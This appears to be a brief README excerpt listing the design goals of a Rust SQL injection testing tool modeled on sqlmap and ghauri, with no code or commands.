Inspired by `sqlmap` and `ghauri` but rewritten for:
- Rust 2024 best practices
- OPSEC-first design
- Bounded async concurrency
- Zero persistence by default